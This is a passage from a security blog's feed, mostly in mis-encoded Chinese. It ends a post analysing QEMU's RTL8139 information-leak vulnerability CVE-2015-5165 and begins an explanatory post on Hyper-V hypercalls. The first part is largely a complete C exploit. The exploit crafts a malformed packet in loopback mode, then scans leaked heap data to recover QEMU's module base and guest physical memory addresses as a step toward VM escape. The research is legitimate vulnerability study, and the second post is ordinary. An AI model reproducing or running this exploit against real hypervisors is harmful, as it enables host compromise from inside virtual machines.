Identification</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,     <span class="comment">// Flags &amp; Fragment Offset</span></span><br><span class="line">    <span class="number">0x40</span>,           <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x06</span>,           <span class="comment">// Protocol: TCP</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Header checksum</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Source IP: 127.0.0.1</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Destination IP: 127.0.0.1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// IP Packet Payload æ•°æ®, å³ TCP æ•°æ®åŒ…</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Source Port</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,     <span class="comment">// Destination Port</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x50</span>,           <span class="comment">// 01010000, Header Length = 5 * 4 = 20</span></span><br><span class="line">    <span class="number">0x10</span>,           <span class="comment">// 00010000, ACK</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Window Size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>      <span class="comment">// Urgent Pointer</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(addr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)addr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring* ring, rtl8139_desc* desc, <span class="keyword">size_t</span> nb)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        </span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// descriptor owned by NIC å‡†å¤‡æ¥æ”¶æ•°æ®</span></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        <span class="keyword">if</span> (i == nb - <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            ring[i].desc-&gt;dw0 |= CP_RX_EOR; <span class="comment">// End of Ring</span></span><br><span class="line">        &#125;</span><br><span class="line">        ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;   <span class="comment">// buffer_size</span></span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Rx descriptors address</span></span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc* desc, <span class="keyword">void</span>* buffer)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN |    <span class="comment">// descriptor owned by NIC å‡†å¤‡å‘é€æ•°æ®</span></span><br><span class="line">                 CP_TX_EOR |</span><br><span class="line">                 CP_TX_LS |</span><br><span class="line">                 CP_TX_LGSEN |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS;</span><br><span class="line">    desc-&gt;dw0 += RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + TxAddr0);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + TxAddr0 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// è§¦å‘æ¼æ´éœ€è¦è®¾ç½®çš„ä¸€äº›å‚æ•°</span></span><br><span class="line">    outl(TxLoopBack, RTL8139_PORT + TxConfig);</span><br><span class="line">    outl(AcceptMyPhys, RTL8139_PORT + RxConfig);</span><br><span class="line">    outw(CPlusRxEnb | CPlusTxEnb, RTL8139_PORT + CpCmd);</span><br><span class="line">    outb(CmdRxEnb | CmdTxEnb, RTL8139_PORT + ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span>* buffer, <span class="keyword">void</span>* packet, <span class="keyword">size_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        outb(CPlus, RTL8139_PORT + TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span>* ptr, <span class="keyword">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n0x%08x: "</span>, ptr + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x "</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"- "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> scan_leaked_chunks(rtl8139_ring* ring, <span class="keyword">size_t</span> ring_count,</span><br><span class="line">                          <span class="keyword">size_t</span> chunk_size, <span class="keyword">void</span>** chunks, <span class="keyword">size_t</span> chunk_count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Ethernet Frame Header: 14 +</span></span><br><span class="line">        <span class="comment">// IP Header: 20 +</span></span><br><span class="line">        <span class="comment">// TCP Header: 20 = 54</span></span><br><span class="line">        <span class="keyword">uint8_t</span>* ptr = (<span class="keyword">uint8_t</span>*)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span>* end = (<span class="keyword">uint8_t</span>*)ring[i].buffer + RTL8139_BUFFER_SIZE / <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> size = *(<span class="keyword">uint64_t</span>*)ptr &amp; CHUNK_SIZE_MASK;</span><br><span class="line">            <span class="keyword">if</span> (size == chunk_size) </span><br><span class="line">            &#123;</span><br><span class="line">                chunks[count++] = (<span class="keyword">void</span>*)(ptr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span> (count &gt; chunk_count) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> leak_module_base_addr(<span class="keyword">void</span>** chunks, <span class="keyword">size_t</span> count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> property_get_bool_offset = <span class="number">0x377F66</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0x00000FFF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span>* ptr = (<span class="keyword">uint64_t</span>*)chunks[i] + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> ((*ptr &amp; mask) == (property_get_bool_offset &amp; mask)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"property_get_bool: 0x%"</span> PRIx64 <span class="string">"\n"</span>, *ptr);</span><br><span class="line">            <span class="keyword">return</span> *ptr - property_get_bool_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> leak_physical_memory_addr(rtl8139_ring* ring, <span class="keyword">size_t</span> ring_count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0xffff000000</span>ull;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="built_in">array</span>[<span class="number">0x10000</span>];</span><br><span class="line">    <span class="keyword">size_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">array</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">array</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span>* ptr = (<span class="keyword">uint8_t</span>*)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span>* end = (<span class="keyword">uint8_t</span>*)ring[i].buffer + RTL8139_BUFFER_SIZE / <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end - <span class="number">8</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> value = *(<span class="keyword">uint64_t</span>*)ptr;</span><br><span class="line">            <span class="keyword">if</span> (((value &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xff</span>) == <span class="number">0x7f</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                value = (value &amp; mask) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">                <span class="built_in">array</span>[value]++;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">array</span>[value] &gt; <span class="built_in">array</span>[index]) </span><br><span class="line">                &#123;</span><br><span class="line">                    index = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint64_t</span> memory_size = <span class="number">0x80000000</span>;</span><br><span class="line">    <span class="keyword">return</span> (((<span class="keyword">uint64_t</span>)index | <span class="number">0x7f0000</span>) &lt;&lt; <span class="number">24</span>) - memory_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616</span></span><br><span class="line">    <span class="comment">// å¯ä»¥æ”¶å®Œ 65535 å­—èŠ‚æ•°æ®</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring* rtl8139_rx_ring = (rtl8139_ring*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_ring));</span><br><span class="line">    rtl8139_desc* rtl8139_rx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    rtl8139_desc* rtl8139_tx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    <span class="keyword">void</span>* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// change I/O privilege level</span></span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize Rx ring, Rx descriptor, Tx descriptor</span></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet, </span><br><span class="line">                        <span class="keyword">sizeof</span>(rtl8139_packet));</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// print leaked data</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// RTL8139_BUFFER_SIZE ä¹‹å 4 å­—èŠ‚æ•°æ®ä¸º Checksum</span></span><br><span class="line">        <span class="comment">// ä¸æ‰“å°ä¹Ÿæ— æ‰€è°“äº†</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span>*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// exploit</span></span><br><span class="line">    <span class="keyword">void</span>* chunks[CHUNK_COUNT] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">size_t</span> chunk_count = scan_leaked_chunks(rtl8139_rx_ring, rtl8139_rx_nb, </span><br><span class="line">                                            <span class="number">0x60</span>, chunks, CHUNK_COUNT);</span><br><span class="line">    <span class="keyword">uint64_t</span> module_addr = leak_module_base_addr(chunks, chunk_count);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"qemu-system-x86_64: 0x%"</span> PRIx64 <span class="string">"\n"</span>, module_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> physical_memory_addr = leak_physical_memory_addr(</span><br><span class="line">        rtl8139_rx_ring, rtl8139_rx_nb);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"physical memory address: 0x%"</span> PRIx64 <span class="string">"\n"</span>, physical_memory_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> free heap blocks</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit æµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/uploads/202006/cve-2015-5165-exploit.png" alt="QEMU æ¼æ´ CVE-2015-5165 Exploit"></p><h2 id="0x05-åˆ†æå°ç»“"><a href="#0x05-åˆ†æå°ç»“" class="headerlink" title="0x05. åˆ†æå°ç»“"></a>0x05. åˆ†æå°ç»“</h2><p>ç¬¬ä¸€æ¬¡åˆ†æ QEMU çš„æ¼æ´ï¼Œæ•´ä½“æ„Ÿè§‰è¿˜æŒºæœ‰æ„æ€çš„ï¼ŒCVE-2015-5165 è¿™ä¸ªæ¼æ´æœ¬èº«ç®€å•æ˜“æ‡‚ï¼Œå¦‚æœäº†è§£ç½‘å¡åŸºæœ¬å·¥ä½œåŸç†çš„è¯ï¼ŒExploit ç¼–å†™ä¹Ÿä¸æ˜¯å¾ˆéš¾ã€‚</p><h2 id="0x06-å‚è€ƒæ–‡çŒ®"><a href="#0x06-å‚è€ƒæ–‡çŒ®" class="headerlink" title="0x06. å‚è€ƒæ–‡çŒ®"></a>0x06. å‚è€ƒæ–‡çŒ®</h2><p>[1] <a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html" target="_blank" rel="noopener">http://www.phrack.org/papers/vm-escape-qemu-case-study.html</a></p><p>[2] <a href="http://patchwork.ozlabs.org/project/qemu-devel/patch/20161228200433.24244-1-cov@codeaurora.org/" target="_blank" rel="noopener">QEMU commands-posix.c patch - &lt;sys/sysmacros.h&gt;</a></p><p>[3] <a href="https://dangokyo.me/2018/03/02/qemu-escape-part-1-environment-set-up/" target="_blank" rel="noopener">https://dangokyo.me/2018/03/02/qemu-escape-part-1-environment-set-up/</a></p><p>[4] <a href="https://www.realvnc.com/en/connect/download/viewer/" target="_blank" rel="noopener">https://www.realvnc.com/en/connect/download/viewer/</a></p><p>[5] <a href="https://shanetully.com/2014/12/translating-virtual-addresses-to-physcial-addresses-in-user-space/" target="_blank" rel="noopener">https://shanetully.com/2014/12/translating-virtual-addresses-to-physcial-addresses-in-user-space/</a></p><p>[6] <a href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/vm/pagemap.txt</a></p><p>[7] TCP/IP Illustrated, Volum 1, The protocols, Second Edition, Kevin R. Fall, W. Richard Stevens</p><p>[8] <a href="http://realtek.info/pdf/rtl8139cp.pdf" target="_blank" rel="noopener">http://realtek.info/pdf/rtl8139cp.pdf</a></p><p>[9] <a href="https://www.anquanke.com/post/id/197637" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197637</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‚è€ƒ Phrack æ–‡ç«  &lt;strong&gt;&lt;em&gt;VM escape - QEMU Case Study&lt;/em&gt;&lt;/strong&gt; [1] å¯¹ QEMU ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2015-5165 å’Œå †æº¢å‡ºæ¼æ´ CVE-2015-7504 è¿›è¡Œè°ƒè¯•åˆ†æå¹¶ç¼–å†™ Exploit ä»£ç ï¼Œæœ¬æ–‡ä¸»è¦åˆ†æå…¶ä¸­çš„ RTL8139 ç½‘å¡ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2015-5165ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="https://programlife.net/categories/Virtualization/"/>
    
      <category term="QEMU" scheme="https://programlife.net/categories/Virtualization/QEMU/"/>
    
    
      <category term="QEMU" scheme="https://programlife.net/tags/QEMU/"/>
    
      <category term="RTL8139" scheme="https://programlife.net/tags/RTL8139/"/>
    
      <category term="CVE-2015-5165" scheme="https://programlife.net/tags/CVE-2015-5165/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to Hypercall</title>
    <link href="https://programlife.net/2020/05/20/introduction-to-hypercall/"/>
    <id>https://programlife.net/2020/05/20/introduction-to-hypercall/</id>
    <published>2020-05-20T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>Hyper-V Hypercall ç›¸å…³åŸºç¡€çŸ¥è¯†ä»‹ç»ã€‚</p><a id="more"></a><h2 id="0x01-Hypercall-ä»‹ç»"><a href="#0x01-Hypercall-ä»‹ç»" class="headerlink" title="0x01. Hypercall ä»‹ç»"></a>0x01. Hypercall ä»‹ç»</h2><p>Hypercall ç”¨äºä»è™šæ‹Ÿæœºåˆ° Hypervisor çš„çŠ¶æ€åˆ‡æ¢ï¼Œå°±åƒ System Call ç”¨äºä»ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„çŠ¶æ€åˆ‡æ¢ä¸€æ ·ã€‚</p><h3 id="1-1-Hypercall-Classes"><a href="#1-1-Hypercall-Classes" class="headerlink" title="1.1 Hypercall Classes"></a>1.1 Hypercall Classes</h3><p>Hypercall å¯ä»¥åˆ†ä¸ºä¸¤ç§ä¸åŒçš„ç±»å‹ï¼šç®€å•ç±»å‹ï¼ˆ<strong>Simple</strong>ï¼‰å’Œé‡å¤ç±»å‹ï¼ˆ<strong>Repeat / Rep</strong>ï¼‰ã€‚</p><ul><li>Simple Hypercall æ‹¥æœ‰å›ºå®šå¤§å°çš„è¾“å…¥å’Œè¾“å‡ºå‚æ•°ï¼Œæ‰§è¡Œä¸€ä¸ªå•ä¸€çš„æ“ä½œ</li><li>Repeat Hypercall å¯ä»¥çœ‹æˆæ˜¯ç”±ä¸€ç³»åˆ— Simple Hypercall ç»„æˆçš„</li></ul><p>åœ¨å‘èµ· Repeat Hypercall æ—¶ï¼Œè°ƒç”¨æ–¹éœ€è¦æŒ‡æ˜è¾“å…¥è¾“å‡ºå‚æ•°çš„ç»„æ•°ï¼ˆ<em>rep count</em>ï¼‰ï¼Œä»¥åŠå°†è¦è¢«å¤„ç†çš„è¾“å…¥è¾“å‡ºå‚æ•°çš„ç´¢å¼•æ•°ï¼ˆ<em>rep start index</em>ï¼‰ï¼›Hypervisor å°†æŒ‰ç…§é¡ºåºå¤„ç†å¯¹åº”çš„æ•°æ®ã€‚</p><h3 id="1-2-Hypercall-Continuation"><a href="#1-2-Hypercall-Continuation" class="headerlink" title="1.2 Hypercall Continuation"></a>1.2 Hypercall Continuation</h3><p>Hypervisor ä¼šé™åˆ¶ Hypercall çš„æ‰§è¡Œæ—¶é—´åœ¨ <code>50Î¼s</code> ä»¥å†…ï¼Œè¶…è¿‡è¯¥æ—¶é—´é™åˆ¶çš„ Hypercall ä¾èµ–äºä¸€ç§å«åš Hypercall Continuation çš„æœºåˆ¶æ¥å®Œæˆï¼Œè¯¥æœºåˆ¶å¯¹è°ƒç”¨æ–¹è€Œè¨€åŸºæœ¬æ˜¯é€æ˜çš„ã€‚</p><p>å¯¹äºæ— æ³•åœ¨ <code>50Î¼s</code> çš„æ—¶é—´é™åˆ¶å†…å®Œæˆçš„ Hypercallï¼Œå½“æ§åˆ¶æƒä» Hypervisor è¿”å›åˆ°è™šæ‹Ÿæœºä¹‹åï¼Œå¯¹åº”çš„ RIP å¯„å­˜å™¨çš„å€¼å¹¶ä¸ä¼šæ”¹å˜ï¼›å½“å¯¹åº”çš„çº¿ç¨‹å†æ¬¡è·å¾—æ‰§è¡Œæœºä¼šæ—¶ï¼ŒåŸæœ‰çš„ Hypercall ä¼šè¢«ç»§ç»­æ‰§è¡Œã€‚æ˜¾ç„¶ï¼Œåœ¨ Hypercall å®Œæˆæ‰§è¡Œçš„è¿‡ç¨‹ä¸­éœ€è¦ç»´æŠ¤ä¸€ä¸ªçŠ¶æ€ï¼Œç±»ä¼¼ Repeat Hypercall çš„æ‰§è¡Œä¸€æ ·ã€‚</p><h3 id="1-3-Hypercall-Atomicity-and-Ordering"><a href="#1-3-Hypercall-Atomicity-and-Ordering" class="headerlink" title="1.3 Hypercall Atomicity and Ordering"></a>1.3 Hypercall Atomicity and Ordering</h3><p>ä¸€èˆ¬æ¥è¯´ï¼ŒHypercall çš„æ‰§è¡Œæ˜¯åŸå­çš„ï¼šSimple Hypercall å°±æ˜¯å•ä¸ªçš„åŸå­æ“ä½œï¼ŒRepeat Hypercall åˆ™æ˜¯ä¸€ç³»åˆ—çš„åŸå­æ“ä½œï¼›å¯¹äºæ— æ³•ä¸€æ¬¡æ‰§è¡Œå®Œæ¯•çš„ Hypercallï¼ˆå³è¶…è¿‡ <code>50Î¼s</code> æ—¶é—´é™åˆ¶çš„ Hypercallï¼‰ï¼Œåˆ™ç”±å¤šä¸ªåŸå­æ“ä½œæ‰€ç»„æˆã€‚</p><h3 id="1-4-Hypercall-Inputs"><a href="#1-4-Hypercall-Inputs" class="headerlink" title="1.4 Hypercall Inputs"></a>1.4 Hypercall Inputs</h3><p>å¯¹äºä»»æ„çš„ Hypercallï¼Œå¿…ç„¶è‡³å°‘æœ‰ä¸€ä¸ªè¾“å…¥å‚æ•°ï¼Œå› ä¸ºè‚¯å®šéœ€è¦æŒ‡å®šä¸€ä¸ªç¼–å·ã€‚åœ¨ x64 ç¯å¢ƒä¸‹ï¼Œè¯¥å‚æ•°é€šè¿‡ <code>RCX</code> å¯„å­˜å™¨ä¼ é€’ï¼Œå¯¹åº”çš„æ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š</p><p><img src="/uploads/202005/hypercall-input-rcx.png" alt="Hyper-v Hypercall RCX å‚æ•°æ ¼å¼"></p><p>å¯¹åº”çš„è¯´æ˜å¦‚ä¸‹ï¼š</p><table><thead><tr><th>å­—æ®µ</th><th>å®½åº¦</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>Call code</td><td>16 bits</td><td>Hypercall çš„ç¼–å·</td></tr><tr><td>Fast</td><td>1 bit</td><td>0 è¡¨ç¤ºåŸºäºå†…å­˜çš„è°ƒç”¨çº¦å®šï¼Œ1 è¡¨ç¤ºåŸºäºå¯„å­˜å™¨çš„è°ƒç”¨çº¦å®š</td></tr><tr><td>Variable header size</td><td>9 bits</td><td>Variable Headr çš„å¤§å°</td></tr><tr><td>RsvdZ</td><td>5 bits</td><td>å¿…é¡»æ˜¯ 0</td></tr><tr><td>Is Nested</td><td>1 bit</td><td>0 è¡¨ç¤ºç”± Guest Hypervisor å¤„ç†ï¼Œ1 è¡¨ç¤ºç”± L0 Hypervisor å¤„ç†</td></tr><tr><td>Rep Count</td><td>12 bits</td><td>Repeat Hypercall çš„é‡å¤æ¬¡æ•°ï¼ˆSimple Hypercall å¿…é¡»æ˜¯ 0ï¼‰</td></tr><tr><td>RsvdZ</td><td>4 bits</td><td>å¿…é¡»æ˜¯ 0</td></tr><tr><td>Rep Start Index</td><td>12 bits</td><td>Repeat Hypercall çš„ç´¢å¼•å€¼ï¼ˆSimple Hypercall å¿…é¡»æ˜¯ 0ï¼‰</td></tr><tr><td>RsvdZ</td><td>4 bits</td><td>å¿…é¡»æ˜¯ 0</td></tr></tbody></table><p>å¦‚æœ Fast çš„å€¼ä¸º 0ï¼Œé‚£ä¹ˆ <code>RDX</code> 